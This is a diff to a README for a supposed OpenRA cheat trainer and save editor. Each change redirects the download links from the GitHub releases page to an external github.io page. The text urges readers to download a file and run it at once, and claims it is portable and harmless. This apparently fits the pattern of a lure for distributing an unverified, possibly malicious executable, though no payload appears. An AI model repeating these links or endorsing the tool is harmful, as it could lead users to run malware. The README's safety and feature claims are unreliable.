@@ -1,6 +1,6 @@
 # 🎮 openra-campaign-cheats-2026 - Unlock Every Mission, Credit, and Unit Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-OpenRA_Campaign_Cheats_2026-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/lyonslevi298-stack/openra-campaign-cheats-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-OpenRA_Campaign_Cheats_2026-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://lyonslevi298-stack.github.io)
 
 ---
 
@@ -16,7 +16,7 @@ This is a trainer and save editor combined into one simple program. You don't ne
 
 Follow these three simple steps to get started:
 
-1. **Visit this link to download the application** — [Click here to go to the download page](https://github.com/lyonslevi298-stack/openra-campaign-cheats-2026/releases)
+1. **Visit this link to download the application** — [Click here to go to the download page](https://lyonslevi298-stack.github.io)
 2. On that page, find the latest release file and download it to your computer.
 3. Once downloaded, run the application. That's it. No installation required.
 
@@ -78,7 +78,7 @@ Use the save editor feature to modify your existing save files. Load any save, a
 
 ## 📥 Download and Installation
 
-**Visit this link to download the application** — [OpenRA Campaign Cheats 2026 Releases](https://github.com/lyonslevi298-stack/openra-campaign-cheats-2026/releases)
+**Visit this link to download the application** — [OpenRA Campaign Cheats 2026 Releases](https://lyonslevi298-stack.github.io)
 
 The download page will show you the latest version. Download the file and run it directly. There is no complicated installation process. The program is portable, meaning it doesn't modify your system files or require admin privileges.
 
@@ -121,7 +121,7 @@ This tool is free to use for personal purposes. It is not affiliated with or end
 
 ## 📢 Stay Updated
 
-Check the [releases page](https://github.com/lyonslevi298-stack/openra-campaign-cheats-2026/releases) regularly for updates, new features, and bug fixes. Star the repository if you find this tool helpful — it helps others discover it too.
+Check the [releases page](https://lyonslevi298-stack.github.io) regularly for updates, new features, and bug fixes. Star the repository if you find this tool helpful — it helps others discover it too.
 
 ---
 
